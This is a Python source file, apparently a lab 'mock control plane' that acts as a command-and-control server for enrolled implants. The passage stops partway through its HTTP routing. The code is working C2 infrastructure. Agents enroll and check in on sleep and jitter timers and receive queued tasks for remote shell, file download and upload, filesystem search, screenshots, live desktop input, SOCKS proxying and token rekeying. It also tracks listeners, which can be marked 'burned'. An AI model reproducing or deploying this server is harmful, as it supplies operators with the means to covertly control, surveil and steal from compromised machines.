#!/usr/bin/env python3
"""Hogwarts mock control plane (lab) — SQLite + stdlib HTTP.

Implements T1–T4 operator routes and agent enroll/checkin/results.
No UI — Hogwarts is the desk.

  PLANE_OPERATOR_TOKEN=dev PLANE_HTTP_ADDR=0.0.0.0:8080 python3 plane/server.py

See hogwarts/backend/CONTRACT.md and notes research/plane.
"""

from __future__ import annotations

import hashlib
import json
import os
import secrets
import sqlite3
import threading
import time
import uuid
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any
from urllib.parse import parse_qs, urlparse

VERSION = "0.5.15-lab"
DEFAULT_ADDR = "127.0.0.1:8080"
DEFAULT_SLEEP = 1.0  # lab default — snappier task round-trips
DEFAULT_JITTER = 0.1
MIN_AGENT_SLEEP = 0.12  # Control turbo (input feels dead above ~0.3s)
# base64 screenshot data may exceed 1 MiB at FHD/QHD — allow larger "data" field
RESULT_CAP = 1_500_000
MAX_TASKS_PER_CHECKIN = 16
INTERACTIVE_SLEEP = 0.15
# v1 + P3/P4 task types
TASK_TYPES = frozenset(
    {
        "ping",
        "shell",
        "note",
        "download",
        "upload",
        "fs_list",
        "fs_index_start",
        "fs_index_status",
        "fs_index_stop",
        "fs_search",
        "screenshot",
        "desktop_start",
        "desktop_stop",
        "desktop_input",
        "session_start",
        "session_stop",
        "socks_start",
        "socks_stop",
        "rekey",
    }
)
LISTENER_STATES = frozenset({"planned", "deployed", "disabled", "burned"})
LISTENER_EVIDENCE = frozenset(
    {"none", "tcp_ok", "process_ok", "plane_managed", "unknown"}
)


def _utc_now() -> str:
    return datetime.now(timezone.utc).replace(microsecond=0).isoformat().replace("+00:00", "Z")


def _hash_token(token: str) -> str:
    return hashlib.sha256(token.encode("utf-8")).hexdigest()


def _new_id(prefix: str) -> str:
    return f"{prefix}_{uuid.uuid4().hex[:16]}"


class Store:
    def __init__(self, path: Path) -> None:
        self.path = path
        self._lock = threading.RLock()
        path.parent.mkdir(parents=True, exist_ok=True)
        self._conn = sqlite3.connect(str(path), check_same_thread=False)
        self._conn.row_factory = sqlite3.Row
        self._init_schema()

    def _init_schema(self) -> None:
        with self._lock:
            c = self._conn
            c.executescript(
                """
                CREATE TABLE IF NOT EXISTS meta (
                  key TEXT PRIMARY KEY,
                  value TEXT NOT NULL
                );
                CREATE TABLE IF NOT EXISTS enroll_secrets (
                  id TEXT PRIMARY KEY,
                  secret_hash TEXT NOT NULL,
                  max_uses INTEGER NOT NULL DEFAULT 1,
                  uses INTEGER NOT NULL DEFAULT 0,
                  expires_at TEXT,
                  created TEXT NOT NULL
                );
                CREATE TABLE IF NOT EXISTS agents (
                  id TEXT PRIMARY KEY,
                  token_hash TEXT NOT NULL,
                  hostname TEXT,
                  username TEXT,
                  os TEXT,
                  arch TEXT,
                  external_ip TEXT,
                  internal_ip TEXT,
                  group_name TEXT,
                  tags TEXT,
                  sleep REAL NOT NULL DEFAULT 5,
                  jitter REAL NOT NULL DEFAULT 0.2,
                  status TEXT NOT NULL DEFAULT 'online',
                  last_seen TEXT,
                  created TEXT NOT NULL
                );
                CREATE TABLE IF NOT EXISTS tasks (
                  id TEXT PRIMARY KEY,
                  agent_id TEXT NOT NULL,
                  type TEXT NOT NULL,
                  payload TEXT NOT NULL,
                  status TEXT NOT NULL,
                  client_request_id TEXT,
                  result TEXT,
                  created TEXT NOT NULL,
                  updated TEXT NOT NULL,
                  FOREIGN KEY(agent_id) REFERENCES agents(id)
                );
                CREATE TABLE IF NOT EXISTS events (
                  id INTEGER PRIMARY KEY AUTOINCREMENT,
                  ts TEXT NOT NULL,
                  level TEXT NOT NULL,
                  channel TEXT NOT NULL,
                  message TEXT NOT NULL,
                  agent_id TEXT,
                  meta TEXT
                );
                CREATE TABLE IF NOT EXISTS listeners (
                  id TEXT PRIMARY KEY,
                  name TEXT,
                  accept_host TEXT,
                  accept_port TEXT,
                  proto TEXT,
                  face TEXT,
                  agent_id TEXT,
                  state TEXT NOT NULL DEFAULT 'planned',
                  evidence TEXT NOT NULL DEFAULT 'none',
                  notes TEXT,
                  created TEXT NOT NULL,
                  updated TEXT NOT NULL
                );
                """
            )
            c.commit()

    def set_operator_token_hash(self, token_hash: str) -> None:
        with self._lock:
            self._conn.execute(
                "INSERT INTO meta(key,value) VALUES('operator_token_hash',?) "
                "ON CONFLICT(key) DO UPDATE SET value=excluded.value",
                (token_hash,),
            )
            self._conn.commit()

    def operator_token_hash(self) -> str | None:
        with self._lock:
            row = self._conn.execute(
                "SELECT value FROM meta WHERE key='operator_token_hash'"
            ).fetchone()
            return str(row["value"]) if row else None

    def add_event(
        self,
        *,
        level: str,
        channel: str,
        message: str,
        agent_id: str | None = None,
        meta: dict[str, Any] | None = None,
    ) -> None:
        with self._lock:
            self._conn.execute(
                "INSERT INTO events(ts,level,channel,message,agent_id,meta) "
                "VALUES(?,?,?,?,?,?)",
                (
                    _utc_now(),
                    level,
                    channel,
                    message,
                    agent_id,
                    json.dumps(meta) if meta else None,
                ),
            )
            self._conn.commit()

    def mint_enroll_secret(
        self, *, max_uses: int = 1, ttl_sec: int = 3600
    ) -> dict[str, Any]:
        secret = secrets.token_urlsafe(24)
        sid = _new_id("enr")
        exp = None
        if ttl_sec > 0:
            exp_ts = time.time() + ttl_sec
            exp = datetime.fromtimestamp(exp_ts, tz=timezone.utc).replace(
                microsecond=0
            ).isoformat().replace("+00:00", "Z")
        with self._lock:
            self._conn.execute(
                "INSERT INTO enroll_secrets(id,secret_hash,max_uses,uses,expires_at,created) "
                "VALUES(?,?,?,?,?,?)",
                (sid, _hash_token(secret), max_uses, 0, exp, _utc_now()),
            )
            self._conn.commit()
        self.add_event(
            level="ok",
            channel="system",
            message=f"enroll secret minted {sid} max_uses={max_uses}",
        )
        return {
            "id": sid,
            "secret": secret,
            "max_uses": max_uses,
            "expires_at": exp,
        }

    def consume_enroll_secret(self, secret: str) -> bool:
        h = _hash_token(secret)
        now = _utc_now()
        with self._lock:
            row = self._conn.execute(
                "SELECT * FROM enroll_secrets WHERE secret_hash=? ORDER BY created DESC",
                (h,),
            ).fetchone()
            if not row:
                return False
            if row["expires_at"] and str(row["expires_at"]) < now:
                return False
            if int(row["uses"]) >= int(row["max_uses"]):
                return False
            self._conn.execute(
                "UPDATE enroll_secrets SET uses=uses+1 WHERE id=?",
                (row["id"],),
            )
            self._conn.commit()
            return True

    def enroll_agent(self, facts: dict[str, Any]) -> dict[str, Any]:
        agent_id = _new_id("agt")
        token = secrets.token_urlsafe(32)
        now = _utc_now()
        with self._lock:
            self._conn.execute(
                "INSERT INTO agents(id,token_hash,hostname,username,os,arch,"
                "external_ip,internal_ip,group_name,tags,sleep,jitter,status,"
                "last_seen,created) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
                (
                    agent_id,
                    _hash_token(token),
                    str(facts.get("hostname") or ""),
                    str(facts.get("username") or ""),
                    str(facts.get("os") or ""),
                    str(facts.get("arch") or ""),
                    str(facts.get("external_ip") or ""),
                    str(facts.get("internal_ip") or ""),
                    str(facts.get("group") or ""),
                    json.dumps(facts.get("tags") or []),
                    float(facts.get("sleep") or DEFAULT_SLEEP),
                    float(facts.get("jitter") or DEFAULT_JITTER),
                    "online",
                    now,
                    now,
                ),
            )
            self._conn.commit()
        self.add_event(
            level="ok",
            channel="agent",
            message=f"enrolled {facts.get('hostname') or agent_id}",
            agent_id=agent_id,
        )
        return {
            "agent_id": agent_id,
            "agent_token": token,
            "sleep": float(facts.get("sleep") or DEFAULT_SLEEP),
            "jitter": float(facts.get("jitter") or DEFAULT_JITTER),
        }

    def agent_by_token(self, token: str) -> sqlite3.Row | None:
        with self._lock:
            return self._conn.execute(
                "SELECT * FROM agents WHERE token_hash=?",
                (_hash_token(token),),
            ).fetchone()

    def agent_by_id(self, agent_id: str) -> sqlite3.Row | None:
        with self._lock:
            return self._conn.execute(
                "SELECT * FROM agents WHERE id=?", (agent_id,)
            ).fetchone()

    def touch_agent(self, agent_id: str, facts: dict[str, Any] | None = None) -> None:
        facts = facts or {}
        with self._lock:
            row = self._conn.execute(
                "SELECT * FROM agents WHERE id=?", (agent_id,)
            ).fetchone()
            if not row:
                return
            sleep = row["sleep"]
            jitter = row["jitter"]
            try:
                if facts.get("sleep") is not None:
                    sleep = max(
                        MIN_AGENT_SLEEP, min(float(facts.get("sleep")), 120.0)
                    )
            except (TypeError, ValueError):
                pass
            try:
                if facts.get("jitter") is not None:
                    jitter = max(0.0, min(float(facts.get("jitter")), 1.0))
            except (TypeError, ValueError):
                pass
            # Pending interactive tasks → force turbo sleep for this check-in cycle
            interactive_pending = False
            try:
                row_n = self._conn.execute(
                    "SELECT COUNT(*) AS n FROM tasks WHERE agent_id=? AND status "
                    "IN ('queued','assigned') AND type IN "
                    "('screenshot','desktop_input')",
                    (agent_id,),
                ).fetchone()
                interactive_pending = bool(row_n and int(row_n["n"] or 0) > 0)
            except Exception:
                interactive_pending = False
            if interactive_pending or facts.get("desktop_interactive"):
                sleep = min(float(sleep or DEFAULT_SLEEP), INTERACTIVE_SLEEP)
                jitter = min(
                    float(jitter if jitter is not None else DEFAULT_JITTER), 0.02
                )
            self._conn.execute(
                "UPDATE agents SET last_seen=?, status='online', "
                "hostname=COALESCE(NULLIF(?,''),hostname), "
                "username=COALESCE(NULLIF(?,''),username), "
                "os=COALESCE(NULLIF(?,''),os), "
                "arch=COALESCE(NULLIF(?,''),arch), "
                "external_ip=COALESCE(NULLIF(?,''),external_ip), "
                "internal_ip=COALESCE(NULLIF(?,''),internal_ip), "
                "sleep=?, jitter=? "
                "WHERE id=?",
                (
                    _utc_now(),
                    str(facts.get("hostname") or ""),
                    str(facts.get("username") or ""),
                    str(facts.get("os") or ""),
                    str(facts.get("arch") or ""),
                    str(facts.get("external_ip") or ""),
                    str(facts.get("internal_ip") or ""),
                    float(sleep or DEFAULT_SLEEP),
                    float(jitter if jitter is not None else DEFAULT_JITTER),
                    agent_id,
                ),
            )
            self._conn.commit()

    def list_agents(
        self, *, status: str | None = None, q: str | None = None, limit: int = 200
    ) -> list[dict[str, Any]]:
        with self._lock:
            rows = self._conn.execute(
                "SELECT * FROM agents ORDER BY "
                "CASE WHEN last_seen IS NULL OR last_seen='' THEN 0 ELSE 1 END DESC, "
                "last_seen DESC, created DESC"
            ).fetchall()
        out: list[dict[str, Any]] = []
        qn = (q or "").lower().strip()
        for r in rows:
            d = self._agent_dict(r)
            if status and d["status"] != status:
                continue
            if qn:
                hay = " ".join(
                    [
                        d["id"],
                        d["hostname"],
                        d["username"],
                        d["os"],
                        d["external_ip"],
                        d["group"],
                    ]
                ).lower()
                if qn not in hay:
                    continue
            out.append(d)
            if len(out) >= limit:
                break
        return out

    def _agent_dict(self, r: sqlite3.Row) -> dict[str, Any]:
        tags_raw = r["tags"]
        try:
            tags = json.loads(tags_raw) if tags_raw else []
        except json.JSONDecodeError:
            tags = []
        # Derive presence from last_seen. Thresholds are intentionally loose so
        # lab agents (sleep ~1.5s) do not thrash online↔idle every desk poll —
        # that thrash rewrote Hogwarts fleet CSS and killed row hover/highlight.
        status = str(r["status"] or "unknown")
        last = r["last_seen"]
        sleep = float(r["sleep"] or DEFAULT_SLEEP)
        if last:
            try:
                ts = datetime.fromisoformat(str(last).replace("Z", "+00:00"))
                age = (datetime.now(timezone.utc) - ts).total_seconds()
                if age > max(45.0, sleep * 6):
                    status = "offline"
                elif age > max(20.0, sleep * 4):
                    status = "idle"
                else:
                    status = "online"
            except ValueError:
                pass
        return {
            "id": r["id"],
            "hostname": r["hostname"] or "",
            "username": r["username"] or "",
            "os": r["os"] or "",
            "arch": r["arch"] or "",
            "status": status,
            "last_seen": r["last_seen"],
            "external_ip": r["external_ip"] or "",
            "internal_ip": r["internal_ip"] or "",
            "group": r["group_name"] or "",
            "tags": tags if isinstance(tags, list) else [],
            "sleep": float(r["sleep"] or DEFAULT_SLEEP),
            "jitter": float(r["jitter"] or DEFAULT_JITTER),
        }

    def create_task(
        self,
        agent_id: str,
        *,
        type_: str,
        payload: dict[str, Any],
        client_request_id: str | None = None,
    ) -> dict[str, Any]:
        if client_request_id:
            with self._lock:
                existing = self._conn.execute(
                    "SELECT * FROM tasks WHERE agent_id=? AND client_request_id=?",
                    (agent_id, client_request_id),
                ).fetchone()
                if existing:
                    return self._task_dict(existing)
        tid = _new_id("tsk")
        now = _utc_now()
        with self._lock:
            # Live Control: only the newest screenshot matters — drop backlog so
            # desktop_input is not stuck behind a pile of obsolete frames.
            if type_ == "screenshot":
                self._conn.execute(
                    "UPDATE tasks SET status='cancelled', updated=? "
                    "WHERE agent_id=? AND type='screenshot' AND status='queued'",
                    (now, agent_id),
                )
            self._conn.execute(
                "INSERT INTO tasks(id,agent_id,type,payload,status,client_request_id,"
                "result,created,updated) VALUES(?,?,?,?,?,?,?,?,?)",
                (
                    tid,
                    agent_id,
                    type_,
                    json.dumps(payload or {}),
                    "queued",
                    client_request_id,
                    None,
                    now,
                    now,
                ),
            )
            self._conn.commit()
        # Skip noisy events for high-frequency desktop traffic
        if type_ not in ("screenshot", "desktop_input"):
            self.add_event(
                level="info",
                channel="task",
                message=f"task {tid} queued type={type_}",
                agent_id=agent_id,
            )
        return {
            "task_id": tid,
            "status": "queued",
            "created": now,
        }

    def list_tasks(
        self, agent_id: str, *, limit: int = 50, compact: bool = True
    ) -> list[dict[str, Any]]:
        """List tasks. compact=True strips heavy result fields (e.g. screenshot b64)."""
        with self._lock:
            rows = self._conn.execute(
                "SELECT * FROM tasks WHERE agent_id=? ORDER BY created DESC LIMIT ?",
                (agent_id, limit),
            ).fetchall()
        out = [self._task_dict(r) for r in rows]
        if compact:
            for t in out:
                self._compact_task_result(t)
        return out

    @staticmethod
    def _compact_task_result(task: dict[str, Any]) -> None:
        res = task.get("result")
        if not isinstance(res, dict):
            return
        data = res.get("data")
        if isinstance(data, str) and len(data) > 64:
            res = dict(res)
            res["data"] = f"<omitted {len(data)} chars>"
            res["_data_omitted"] = True
            # Drop other huge blobs if any
            for k, v in list(res.items()):
                if k != "data" and isinstance(v, str) and len(v) > 4000:
                    res[k] = v[:200] + f"…<omitted {len(v) - 200}>"
            task["result"] = res

    def get_task(self, task_id: str) -> dict[str, Any] | None:
        with self._lock:
            row = self._conn.execute(
                "SELECT * FROM tasks WHERE id=?", (task_id,)
            ).fetchone()
        return self._task_dict(row) if row else None

    def cancel_task(self, task_id: str) -> dict[str, Any]:
        """Cancel queued or assigned tasks. Terminal states are left alone."""
        now = _utc_now()
        with self._lock:
            row = self._conn.execute(
                "SELECT * FROM tasks WHERE id=?", (task_id,)
            ).fetchone()
            if not row:
                raise KeyError("task_not_found")
            st = str(row["status"] or "")
            if st in ("succeeded", "failed", "cancelled"):
                return self._task_dict(row)
            if st not in ("queued", "assigned"):
                raise ValueError(f"cannot cancel status={st}")
            self._conn.execute(
                "UPDATE tasks SET status='cancelled', updated=? WHERE id=?",
                (now, task_id),
            )
            self._conn.commit()
            agent_id = row["agent_id"]
        self.add_event(
            level="warn",
            channel="task",
            message=f"task {task_id} cancelled",
            agent_id=agent_id,
        )
        return self.get_task(task_id) or {}

    def _task_dict(self, r: sqlite3.Row) -> dict[str, Any]:
        try:
            payload = json.loads(r["payload"] or "{}")
        except json.JSONDecodeError:
            payload = {}
        result = None
        if r["result"]:
            try:
                result = json.loads(r["result"])
            except json.JSONDecodeError:
                result = {"raw": r["result"]}
        return {
            "id": r["id"],
            "agent_id": r["agent_id"],
            "type": r["type"],
            "payload": payload,
            "status": r["status"],
            "client_request_id": r["client_request_id"],
            "result": result,
            "created": r["created"],
            "updated": r["updated"],
        }

    def pull_tasks_for_agent(self, agent_id: str) -> list[dict[str, Any]]:
        with self._lock:
            rows = self._conn.execute(
                "SELECT * FROM tasks WHERE agent_id=? AND status='queued' "
                "ORDER BY created ASC LIMIT ?",
                (agent_id, MAX_TASKS_PER_CHECKIN * 3),
            ).fetchall()
            # Priority: input first (Control feel), at most one screenshot, rekey last
            def prio(r: sqlite3.Row) -> tuple[int, str]:
                t = str(r["type"] or "")
                if t == "desktop_input":
                    return (0, r["created"] or "")
                if t == "screenshot":
                    return (1, r["created"] or "")
                if t == "rekey":
                    return (9, r["created"] or "")
                return (5, r["created"] or "")

            rows = sorted(rows, key=prio)
            selected: list[sqlite3.Row] = []
            saw_shot = False
            for r in rows:
                t = str(r["type"] or "")
                if t == "screenshot":
                    if saw_shot:
                        # Supersede older queued frames
                        self._conn.execute(
                            "UPDATE tasks SET status='cancelled', updated=? WHERE id=?",
                            (_utc_now(), r["id"]),
                        )
                        continue
                    saw_shot = True
                selected.append(r)
                if len(selected) >= MAX_TASKS_PER_CHECKIN:
                    break

            now = _utc_now()
            out: list[dict[str, Any]] = []
            for r in selected:
                payload = {}
                try:
                    payload = json.loads(r["payload"] or "{}")
                except json.JSONDecodeError:
                    payload = {}
                # rekey: mint new_token into payload only — apply hash on result
                # so other tasks in the same check-in still post with the old token.
                if str(r["type"]) == "rekey":
                    new_token = secrets.token_urlsafe(32)
                    payload = dict(payload or {})
                    payload["new_token"] = new_token
                    self._conn.execute(
                        "UPDATE tasks SET payload=?, status='assigned', updated=? WHERE id=?",
                        (json.dumps(payload), now, r["id"]),
                    )
                else:
                    self._conn.execute(
                        "UPDATE tasks SET status='assigned', updated=? WHERE id=?",
                        (now, r["id"]),
                    )
                out.append(
                    {
                        "id": r["id"],
                        "type": r["type"],
                        "payload": payload,
                    }
                )
            self._conn.commit()
        return out

    def post_result(
        self, agent_id: str, *, task_id: str, status: str, result: dict[str, Any]
    ) -> None:
        # Cap oversized stdout/stderr
        result = dict(result or {})
        for key in ("stdout", "stderr", "data"):
            if key in result and isinstance(result[key], str):
                if len(result[key]) > RESULT_CAP * 2 and key == "data":
                    result[key] = result[key][: RESULT_CAP * 2]
                    result["truncated"] = True
                elif key != "data" and len(result[key]) > RESULT_CAP:
                    result[key] = result[key][:RESULT_CAP]
                    result["truncated"] = True
        now = _utc_now()
        st = status if status in ("succeeded", "failed") else "failed"
        with self._lock:
            row = self._conn.execute(
                "SELECT * FROM tasks WHERE id=? AND agent_id=?",
                (task_id, agent_id),
            ).fetchone()
            if not row:
                raise KeyError("task_not_found")
            self._conn.execute(
                "UPDATE tasks SET status=?, result=?, updated=? WHERE id=?",
                (st, json.dumps(result), now, task_id),
            )
            # Apply rekey only after successful result (agent still used old token)
            if st == "succeeded" and str(row["type"]) == "rekey":
                try:
                    pl = json.loads(row["payload"] or "{}")
                except json.JSONDecodeError:
                    pl = {}
                new_token = str(pl.get("new_token") or "")
                if new_token:
                    self._conn.execute(
                        "UPDATE agents SET token_hash=? WHERE id=?",
                        (_hash_token(new_token), agent_id),
                    )
            self._conn.commit()
        self.add_event(
            level="ok" if st == "succeeded" else "error",
            channel="task",
            message=f"task {task_id} {st}",
            agent_id=agent_id,
        )

    def list_listeners(self) -> list[dict[str, Any]]:
        with self._lock:
            rows = self._conn.execute(
                "SELECT * FROM listeners ORDER BY updated DESC, created DESC"
            ).fetchall()
        return [self._listener_dict(r) for r in rows]

    def get_listener(self, lid: str) -> dict[str, Any] | None:
        with self._lock:
            row = self._conn.execute(
                "SELECT * FROM listeners WHERE id=?", (lid,)
            ).fetchone()
        return self._listener_dict(row) if row else None

    def _listener_dict(self, r: sqlite3.Row) -> dict[str, Any]:
        return {
            "id": r["id"],
            "name": r["name"] or "",
            "accept_host": r["accept_host"] or "",
            "accept_port": r["accept_port"] or "",
            "proto": r["proto"] or "",
            "face": r["face"] or "",
            "agent_id": r["agent_id"] or "",
            "state": r["state"] or "planned",
            "evidence": r["evidence"] or "none",
            "notes": r["notes"] or "",
            "created": r["created"],
            "updated": r["updated"],
        }

    def upsert_listener(self, body: dict[str, Any]) -> dict[str, Any]:
        lid = str(body.get("id") or "").strip() or _new_id("lst")
        now = _utc_now()
        state = str(body.get("state") or "planned")
        if state not in LISTENER_STATES:
            state = "planned"
        evidence = str(body.get("evidence") or "none")
        if evidence not in LISTENER_EVIDENCE:
            evidence = "none"
        with self._lock:
            existing = self._conn.execute(
                "SELECT id, created FROM listeners WHERE id=?", (lid,)
            ).fetchone()
            created = existing["created"] if existing else now
            self._conn.execute(
                "INSERT INTO listeners(id,name,accept_host,accept_port,proto,face,"
                "agent_id,state,evidence,notes,created,updated) "
                "VALUES(?,?,?,?,?,?,?,?,?,?,?,?) "
                "ON CONFLICT(id) DO UPDATE SET "
                "name=excluded.name, accept_host=excluded.accept_host, "
                "accept_port=excluded.accept_port, proto=excluded.proto, "
                "face=excluded.face, agent_id=excluded.agent_id, "
                "state=excluded.state, evidence=excluded.evidence, "
                "notes=excluded.notes, updated=excluded.updated",
                (
                    lid,
                    str(body.get("name") or ""),
                    str(body.get("accept_host") or ""),
                    str(body.get("accept_port") or ""),
                    str(body.get("proto") or ""),
                    str(body.get("face") or ""),
                    str(body.get("agent_id") or ""),
                    state,
                    evidence,
                    str(body.get("notes") or ""),
                    created,
                    now,
                ),
            )
            self._conn.commit()
        self.add_event(
            level="info",
            channel="listener",
            message=f"listener upsert {lid} state={state} evidence={evidence}",
        )
        return self.get_listener(lid) or {}

    def delete_listener(self, lid: str) -> bool:
        with self._lock:
            cur = self._conn.execute("DELETE FROM listeners WHERE id=?", (lid,))
            self._conn.commit()
            ok = cur.rowcount > 0
        if ok:
            self.add_event(
                level="warn",
                channel="listener",
                message=f"listener deleted {lid}",
            )
        return ok

    def list_events(
        self, *, since: str | None = None, limit: int = 100
    ) -> list[dict[str, Any]]:
        with self._lock:
            if since:
                rows = self._conn.execute(
                    "SELECT * FROM events WHERE ts > ? ORDER BY id ASC LIMIT ?",
                    (since, limit),
                ).fetchall()
            else:
                rows = self._conn.execute(
                    "SELECT * FROM events ORDER BY id DESC LIMIT ?",
                    (limit,),
                ).fetchall()
                rows = list(reversed(rows))
        out = []
        for r in rows:
            meta = None
            if r["meta"]:
                try:
                    meta = json.loads(r["meta"])
                except json.JSONDecodeError:
                    meta = None
            out.append(
                {
                    "ts": r["ts"],
                    "level": r["level"],
                    "channel": r["channel"],
                    "message": r["message"],
                    "agent_id": r["agent_id"],
                    "meta": meta,
                }
            )
        return out


class PlaneState:
    def __init__(self) -> None:
        db = Path(
            os.environ.get(
                "PLANE_DB",
                str(Path.home() / ".local/share/hogwarts-plane/plane.db"),
            )
        )
        self.store = Store(db)
        token = os.environ.get("PLANE_OPERATOR_TOKEN", "").strip()
        if not token:
            token = "dev"
            print(
                "[plane] PLANE_OPERATOR_TOKEN unset — using lab default 'dev'",
                flush=True,
            )
        self.store.set_operator_token_hash(_hash_token(token))
        self.operator_token = token
        print(f"[plane] db={db}", flush=True)
        print(f"[plane] operator token configured (len={len(token)})", flush=True)


STATE: PlaneState | None = None


def _json_response(
    handler: BaseHTTPRequestHandler, code: int, body: dict[str, Any]
) -> None:
    raw = json.dumps(body).encode("utf-8")
    handler.send_response(code)
    handler.send_header("Content-Type", "application/json; charset=utf-8")
    handler.send_header("Content-Length", str(len(raw)))
    handler.send_header("Cache-Control", "no-store")
    handler.end_headers()
    handler.wfile.write(raw)


def _err(
    handler: BaseHTTPRequestHandler, code: int, err_code: str, message: str
) -> None:
    _json_response(
        handler, code, {"error": {"code": err_code, "message": message}}
    )


def _read_json(handler: BaseHTTPRequestHandler) -> dict[str, Any]:
    length = int(handler.headers.get("Content-Length") or "0")
    if length <= 0:
        return {}
    raw = handler.rfile.read(length)
    if not raw:
        return {}
    try:
        data = json.loads(raw.decode("utf-8"))
    except (UnicodeDecodeError, json.JSONDecodeError) as exc:
        raise ValueError(f"invalid json: {exc}") from exc
    if not isinstance(data, dict):
        raise ValueError("json body must be object")
    return data


def _bearer(handler: BaseHTTPRequestHandler) -> str | None:
    auth = handler.headers.get("Authorization") or ""
    if auth.lower().startswith("bearer "):
        return auth[7:].strip()
    return None


class Handler(BaseHTTPRequestHandler):
    server_version = f"hogwarts-plane/{VERSION}"

    def log_message(self, fmt: str, *args: Any) -> None:
        print(f"[plane] {self.address_string()} {fmt % args}", flush=True)

    def do_GET(self) -> None:  # noqa: N802
        self._dispatch("GET")

    def do_POST(self) -> None:  # noqa: N802
        self._dispatch("POST")

    def do_PUT(self) -> None:  # noqa: N802
        self._dispatch("PUT")

    def do_DELETE(self) -> None:  # noqa: N802
        self._dispatch("DELETE")

    def _dispatch(self, method: str) -> None:
        assert STATE is not None
        store = STATE.store
        parsed = urlparse(self.path)
        path = parsed.path.rstrip("/") or "/"
        qs = parse_qs(parsed.query)

        try:
            # Health — open
            if method == "GET" and path in ("/api/v1/health", "/health"):
                _json_response(
                    self,
                    200,
                    {
                        "status": "ok",
                        "version": VERSION,
                        "time": _utc_now(),
                    },
                )
                return

            # Agent implant routes — exact /api/v1/agent/… (not /agents)
            if path.startswith("/api/v1/agent/"):
                if method == "POST" and path == "/api/v1/agent/enroll":
                    body = _read_json(self)
                    secret = str(body.get("enroll_secret") or "").strip()
                    if not secret or not store.consume_enroll_secret(secret):
                        _err(self, 403, "forbidden", "invalid enroll secret")
                        return
                    facts = {
                        k: body.get(k)
                        for k in (
                            "hostname",
                            "username",
                            "os",
                            "arch",
                            "external_ip",
                            "internal_ip",
                            "group",
                            "tags",
                            "sleep",
                            "jitter",
                        )
                    }
                    out = store.enroll_agent(facts)
                    _json_response(self, 201, out)
                    return

                tok = _bearer(self)
                agent = store.agent_by_token(tok) if tok else None
                if not agent:
                    _err(self, 401, "unauthorized", "invalid agent token")
                    return

                if method == "POST" and path == "/api/v1/agent/checkin":
                    body = _read_json(self)
                    store.touch_agent(agent["id"], body)
                    agent = store.agent_by_id(agent["id"]) or agent
                    tasks = store.pull_tasks_for_agent(agent["id"])
                    sleep_out = float(agent["sleep"] or DEFAULT_SLEEP)
                    jitter_out = float(agent["jitter"] or DEFAULT_JITTER)
                    # If we just handed interactive work, keep agent on short leash
                    if any(
                        str(t.get("type") or "")
                        in ("screenshot", "desktop_input")
                        for t in tasks
                    ):
                        sleep_out = min(sleep_out, INTERACTIVE_SLEEP)
                        jitter_out = min(jitter_out, 0.02)
                    _json_response(
                        self,
                        200,
                        {
                            "server_time": _utc_now(),
                            "sleep": sleep_out,
                            "jitter": jitter_out,
                            "tasks": tasks,
                        },
                    )
                    return

                if method == "POST" and path == "/api/v1/agent/results":
                    body = _read_json(self)
                    task_id = str(body.get("task_id") or "").strip()
                    status = str(body.get("status") or "failed").strip()
                    result = body.get("result")
                    if not isinstance(result, dict):
                        result = {}
                    try:
                        store.post_result(
                            agent["id"],
                            task_id=task_id,
                            status=status,
                            result=result,
                        )
                    except KeyError:
                        _err(self, 404, "not_found", "task not found")
                        return
                    _json_response(self, 200, {"ok": True})
                    return

                if method == "POST" and path == "/api/v1/agent/events":
                    body = _read_json(self)
                    store.add_event(
                        level=str(body.get("level") or "info"),
                        channel="agent",
                        message=str(body.get("message") or ""),
                        agent_id=agent["id"],
                    )
                    _json_response(self, 200, {"ok": True})
                    return

                _err(self, 404, "not_found", f"no route {method} {path}")
                return

            # Operator routes (/api/v1/agents, tasks, events, enroll-secrets)
            if path.startswith("/api/v1/"):
                tok = _bearer(self)
                if not tok or _hash_token(tok) != store.operator_token_hash():
                    _err(self, 401, "unauthorized", "invalid operator token")
                    return

                if method == "GET" and path == "/api/v1/agents":
                    status = (qs.get("status") or [None])[0]
                    q = (qs.get("q") or [None])[0]
                    limit = int((qs.get("limit") or ["200"])[0])
                    agents = store.list_agents(
                        status=status, q=q, limit=max(1, min(limit, 500))
                    )
                    _json_response(
                        self, 200, {"agents": agents, "next_cursor": None}
                    )
                    return

                if method == "GET" and path.startswith("/api/v1/agents/"):
                    rest = path[len("/api/v1/agents/") :]
                    if rest.endswith("/tasks"):
                        agent_id = rest[: -len("/tasks")]
                        limit = int((qs.get("limit") or ["50"])[0])
                        # full=1 keeps base64 result bodies (rare); default compact
                        full = (qs.get("full") or ["0"])[0] in ("1", "true", "yes")
                        tasks = store.list_tasks(
                            agent_id,
                            limit=max(1, min(limit, 200)),
                            compact=not full,
                        )
                        _json_response(self, 200, {"tasks": tasks})
                        return
                    if "/tasks" not in rest:
                        agent = store.agent_by_id(rest)
                        if not agent:
                            _err(self, 404, "not_found", "agent not found")
                            return
                        _json_response(
                            self, 200, {"agent": store._agent_dict(agent)}
                        )
                        return

                if (
                    method == "POST"
                    and path.startswith("/api/v1/agents/")
                    and path.endswith("/tasks")
                ):
                    agent_id = path[len("/api/v1/agents/") : -len("/tasks")]
                    if not store.agent_by_id(agent_id):
                        _err(self, 404, "not_found", "agent not found")
                        return
                    body = _read_json(self)
                    type_ = str(body.get("type") or "").strip()
                    if type_ not in TASK_TYPES:
                        _err(
                            self,
                            400,
                            "invalid",
                            f"type must be one of {sorted(TASK_TYPES)}",
                        )
                        return
                    payload = body.get("payload")
                    if not isinstance(payload, dict):
                        payload = {}
                    crid = body.get("client_request_id")
                    created = store.create_task(
                        agent_id,
                        type_=type_,
                        payload=payload,
                        client_request_id=str(crid) if crid else None,
                    )
                    _json_response(self, 202, created)
                    return

                if method == "POST" and path.startswith("/api/v1/tasks/") and path.endswith(
                    "/cancel"
                ):
                    task_id = path[len("/api/v1/tasks/") : -len("/cancel")]
                    if not task_id:
                        _err(self, 400, "invalid", "task id required")
                        return
                    try:
                        task = store.cancel_task(task_id)
                    except KeyError:
                        _err(self, 404, "not_found", "task not found")
                        return
                    except ValueError as exc:
                        _err(self, 400, "invalid", str(exc))
                        return
                    _json_response(self, 200, {"task": task})
                    return

                if method == "GET" and path.startswith("/api/v1/tasks/"):
                    task_id = path[len("/api/v1/tasks/") :]
                    if not task_id or task_id.endswith("/cancel"):
                        _err(self, 400, "invalid", "task id required")
                        return
                    task = store.get_task(task_id)
                    if not task:
